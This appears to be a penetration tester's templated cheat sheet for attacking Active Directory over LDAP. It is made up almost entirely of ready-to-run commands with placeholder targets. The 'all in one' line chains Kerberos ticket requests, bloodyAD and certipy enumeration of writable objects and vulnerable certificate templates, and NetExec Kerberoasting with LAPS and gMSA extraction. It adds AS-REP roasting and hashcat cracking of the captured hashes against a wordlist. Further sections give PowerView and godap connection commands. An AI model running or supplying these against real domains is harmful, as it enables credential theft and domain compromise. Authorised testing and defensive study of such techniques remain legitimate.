# LDAP
#target/remote #os/linux #cat/ad #proto/ldap #port/389

## LDAP all in one
```
getTGT.py <domain>/'<user>'<impacket_auth>;export KRB5CCNAME=$(pwd)/'<user>'.ccache; bloodyAD --host <fqdn> -d <domain> -u '<user>' -k get writable; certipy find -enabled -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2; certipy find -vulnerable -u '<user>'@<domain> -k -target <fqdn> -dc-ip <dc_ip> -stdout -timeout 2; nxc ldap <ip> --use-kcache --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; nxc ldap <ip> --use-kcache -M maq -M adcs -M laps -M sccm -M pre2k; GetNPUsers.py -request -outputfile hashes.asreproast <domain>/<user> -k -no-pass -dc-host <fqdn>; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force; powerview <domain>/<user>@<fqdn> -k --no-pass --web
```

## PowerView connect
```
powerview <domain>/'<user>'<auth> --no-cache
```

## Powerview anonymous connect
```
powerview <fqdn> --no-cache
```

## godap connect
```
godap <fqdn> -u '<user>' -d <domain> <auth> -t 'ldap/<fqdn>'
```
